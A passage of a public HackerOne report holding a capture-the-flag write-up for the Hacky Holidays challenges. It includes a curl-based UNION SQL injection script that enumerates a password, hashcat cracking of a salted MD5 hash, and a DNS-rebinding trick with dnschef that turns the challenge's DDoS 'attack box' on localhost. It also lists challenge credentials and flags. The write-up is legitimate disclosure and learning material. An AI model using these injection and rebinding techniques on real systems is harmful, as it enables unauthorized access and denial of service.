o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do\n/bin/echo -n \"$word: \"\npath=$(/bin/echo -n \"../api/user?pass=$start$word%\" |xxd -p | tr -d '\\n')\necho path: ${path}\npicurl=$(curl https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album\\?hash=\\'+UNION+ALL+SELECT+\\\"-1\\'+union+all+select+NULL,NULL,0x${path}--+-\\\",2,3--+- -s|grep data= |sed 's/^.*src=\"\\([^\"]*\\)\"\u003e/\\1/')\necho $picurl\n\ncurl -s \"https://hackyholidays.h1ctf.com$picurl\"  | grep -i invalid\necho\ndone\n```\n\nExample usage: `./user-enumeration-script.sh grin`\n\nAfter some tedious work we found the credentials **grinchadmin** **s4nt4sucks** \nThese credentials work on /attack-box button giving us flag11:\n\n\tflag{07a03135-9778-4dee-a83c-7ec330728e72}\n\nTomorrow, let's see what is inside this evil box!\n\n# flag12\n\n\nThe grinch attack box fires DDOS against given IPs\n\n- 203.0.113.33 \t\n- 203.0.113.53 \t\n- 203.0.113.213\n\nAttacks are launched via this kind of request\n\n\tGET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1\n\nthat redirects you on a page with many similar requests that give the Grinch a feedback on his ddos success of failure\n\n\tGET /attack-box/launch/332e283ebf958178fdae26345b921c68.json?id=0 HTTP/1.1\t\nAttack requests contain (base64 encoded) something like \n\n\t{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n\nIt is evident from tampering with the target value, that there is some kind of authentication: target of the attack and hash must match.\n\n\t{\"target\":\"203.0.113.33\", \"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}\n\t{\"target\":\"203.0.113.53\", \"hash\":\"2814f9c7311a82f1b822585039f62607\"}\n\t{\"target\":\"203.0.113.213\",\"hash\":\"5aa9b5a497e3918c0e1900b2a2228c38\"}\n\nWhile in flag11 there probably was a sound hashing mechanism (like HMAC), here it's easy to find a problem\nbecause the Grinch used the infamous combination of `md5($salt.$ip)`, choosing the salt from well known passwords.\n\nBy concatenating the first ip `203.0.113.33` with password chosen from the famous *rockyou* list and by\nusing hashcat we are able to see that the first hash corresponds to this:\n\n\t5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33\n\t\nFollowing commands show how we build a wordlist with the concatened IP address used as input for haschat:\n\n```\ncat rockyou.txt | awk '{print $0\"203.0.113.33\"}' \u003e list.txt\nhashcat -O -m0 -a0 hash.txt list.txt \n\nDictionary cache built:\n* Filename..: list.txt\n* Passwords.: 14344392\n* Bytes.....: 312054211\n* Keyspace..: 14343895\n* Runtime...: 2 secs\n\n5f2940d65ca4140cc18d0878bc398955:mrgrinch463203.0.113.33\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: MD5\nHash.Target......: 5f2940d65ca4140cc18d0878bc398955\n```\n\nSo the salt is `mrgrinch463`\n\nThis is easily confirmed by creating this request, now lecit.\n\n\t{\"target\":\"127.0.0.1\",\"hash\":\"3e3f8df1658372edf0214e202acb460b\"}\n\nUnfortunately this only gives\n\n```\nHost Information for: 127.0.0.1\nLocal target detected, aborting attack\nSetting Target Information\nGetting Host Information for: 127.0.0.1\nLocal target detected, aborting attack\n```\n\nWe then started to use hostnames instead of ip addresses but we got strange responses from the server which put us in a wrong direction (maybe too many hackers trying to DDOS the Grinch server with many requests...).\n\nAnyay, when situation stabilizes it is clear that some basic trick do not work, like using `127.0.0.1.xip.io`. The grinch server specifically resolves hostname\nand checks that a DDOS is not launched against itself: 127.0.0.1. That is definitely our target, wherever the Grinch hides.\n\nGiven the extensive checks that the grinch does to see if his DDOS is successful, an idea comes to mind. What if\nwhe set up a name server that responds with a non local ip on first requests, and then change the resolution to 127.0.0.1?\nMaybe second time the check against local IPs is not in place (a classic TOCTOU - Time Of Check Time Of Use - vulnerability).\n\nOur hypotesis is based on the observation of this beavhiour:\n\n```\nSetting Target Information\nGetting Host Information for: 192.168.1.1.xip.io\nHost resolves to 192.168.1.1\nSpinning up botnet\nLaunching attack against: 192.168.1.1.xip.io / 192.168.1.1\nping 192.168.1.1\n64 bytes from 192.168.1.1: icmp_seq=1 ttl=118 time=22.9 ms\n64 bytes from 192.168.1.1: icmp_seq=2 ttl=118 time=21.2 ms\n64 bytes from 192.168.1.1: icmp_seq=3 ttl=118 time=15.9 ms\nHost still up, maybe try again?\n```\n\n-  Get host information: resolves, check is different that 127.0.0.1\n-  then attack\n\nMaybe in the attack phase 127.0.0.1 is not checked again.\n\nSo we started our fake nameserver using dnschef\n\n\tdnschef -i 0.0.0.0 --fakeip 192.168.1.1\n\t\nhaving in mind that we should be quite quick and launch it again with different options:\t\n\n\tdnschef -i 0.0.0.0 --fakeip 127.0.0.1\n\n\nWhat happens on the grinch server is described below:\n\n- first check for hostname, it resolves to a non local ip so is good and botnet is spinned up:\n\n```\nGET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=0 HTTP/1.1\n\n[{\"id\":\"3348\",\"content\":\"Setting Target Information\",\"goto\":false},{\"id\":\"3350\",\"content\":\"Getting Host Information for: x.*********.tk\",\"goto\":false},{\"id\":\"3351\",\"content\":\"Host resolves to 192.168.1.1\",\"goto\":false},{\"id\":\"3352\",\"content\":\"Spinning up botnet\",\"goto\":false}]\n```\n\n- later on, the check is not in place and our server resolves to 127.0.0.1:\n\n```\nGET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3352 HTTP/1.1\n[{\"id\":\"3358\",\"content\":\"Launching attack against: x.*********.tk \\/ 127.0.0.1\",\"goto\":false},{\"id\":\"3359\",\"content\":\"No Response from attack server, retrying...\",\"goto\":false}]\n```\n\nAfter all the DDOS is launched and we got confirmation from the Grinch attack box:\n\n```\nGET /attack-box/launch/61ec3012f816c47060c720d5400fe910.json?id=3360 HTTP/1.1\n[{\"id\":\"3362\",\"content\":\"No Response from attack server, retrying...\",\"goto\":\"\\/attack-box\\/challenge-completed-a3c589ba2709\"}]\n```\n\nFinally we are redirected and we see the message:\n\n```\nWell done! You've taken down Grinch Networks and saved the holidays!\n\nflag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\n```\n\nMerry Xmas!\n\n\n---------\n\nflag{48104912-28b0-494a-9995-a203d1e261e7}\nflag{b7ebcb75-9100-4f91-8454-cfb9574459f7}\nflag{b705fb11-fb55-442f-847f-0931be82ed9a}\nflag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}\nflag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}\nflag{18b130a7-3a79-4c70-b73b-7f23fa95d395}\nflag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}\nflag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\nflag{6e8a2df4-5b14-400f-a85a-08a260b59135}\nflag{99309f0f-1752-44a5-af1e-a03e4150757d}\nflag{07a03135-9778-4dee-a83c-7ec330728e72}\nflag{ba6586b0-e482-41e6-9a68-caf9941b48a0}\n\n## Impact\n\nwe are able to dos 127.0.0.1","weakness":{"id":65,"name":"Business Logic Errors"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":1128801,"file_name":"Schermata_2020-12-23_alle_23.23.33.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1muoj9qx77hldynqt6kbq3zkuivm?response-content-disposition=attachment%3B%20filename%3D%22Schermata_2020-12-23_alle_23.23.33.png%22%3B%20filename%2A%3DUTF-8%27%27Schermata_2020-12-23_alle_23.23.33.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4NIHB2M2%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132111Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIE3FUcgRK7FM%2F7U9PAkh6%2BI7wZViD1MP1Y8qZWLRN1eUAiAgc4SQu0yGJV%2BOQRn82JsTD2%2Bd2fHZQycxL60pz%2B7CjyqDBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMkR9JAvrXeOfq9Rc6KtcDp5bGOpV6FTgydp%2FZOb6Bh6HFPtwnCVZfa015OiSuBfCxPwur%2F7aSPKTNE0sy0w9C45qL0zZ1nOQQos0M24uDH67J2wRZXM50ImEA29W1ENYnCggW3Oj1ThbKF4WgRsg%2F9mjcm%2BZmkVxvLoYJ9V%2BPAToGVUPNdCuARshEYKICR0Xo5x6JoDNaCt8Ld9eGqOBMXV3rned7uAPh8EmsbYJGE3kgeYkoAT36Qaqe4UgPgyO9VFwa9aDWRX%2B50CKWSjbjZzr%2BF%2B9jH4MB%2FxFZ4EWRHEor6ZAw08vWfwqAZLqqZdMNm9vuS82Y9DrOKW2mwiXSVAN3ddQvsOMXsKnTXkUhnfuaQmZvTtYFFm%2BIF8eMq92q4rbYHzak7PfNtWyYQ5raA9JIgznaWFJzJX%2BJlzu%2Bu3r2q3jjPLUM80AxozLcRqWVvYBpiIJlFx45cKPkX%2F2%2BeKoncWc%2B6ePWFPme30ZUDKqp6naa4cEDN31MhQC6Orokr1YD%2FJvOnl4SUarbB1%2BVgfPNBbXbzGIn%2BQ51fempHBLdSWygAxQb8EgPDJYVXZxvBJySlPreu1xMH98Dq97W1%2FcRuSdU1ytWMJPT5MEKol3iFlX9S3vBhB4zpCiL0Qjhs8rBVdayMKLXkIsGOqYB2%2BJTBbMxNO8iefRZNNANeiPRoGrUFs7jVSy6MeL55bB1oEjsBrS1ldm2HFxpIsKxeGY%2Fw5R4r6d07DNpzBAlMx0mvj%2FrMVfwHZDUaLkkIW7L5kfZJyauAUQfU1Yr9%2Flzl1bTl9jiK08pDtPhZS7%2FjLscylmOg0jy%2BlazgeqN9hRW54AGkI6XkZty9qqJMe%2BYbSVGEfkYqEbJxp7dv5pFW%2Ftu9oswsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=54cb469de03c8de0d7a77d76765c7a0f01aed36075a607e5b41b3658f8814e5c","file_size":646892,"type":"image/png"}],"allow_singular_disclosure_at":"2021-02-11T07:43:31.754Z","allow_singular_disclosure_after":-20929060.10006044,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"severity":{"rating":"high","score":8.1,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":59882,"asset_type":"URL","asset_identifier":"hackyholidays.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10299587,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for participating in the 12 Days of Hacky Holidays and helping us stop the grinch! ","automated_response":false,"created_at":"2021-01-07T21:31:36.579Z","updated_at":"2021-01-07T21:31:36.579Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"shamollash","url":"/shamollash"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10336468,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"It was an interesting adventure. Can you disclose my report ? thanks","automated_response":false,"created_at":"2021-01-12T07:43:31.722Z","updated_at":"2021-01-12T07:43:31.722Z","first_to_agree":true,"actor":{"username":"shamollash","cleared":false,"url":"/shamollash","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10343267,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-12T17:56:48.594Z","updated_at":"2021-01-12T17:56:48.594Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10343268,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-12T17:56:48.687Z","updated_at":"2021-01-12T17:56:48.687Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}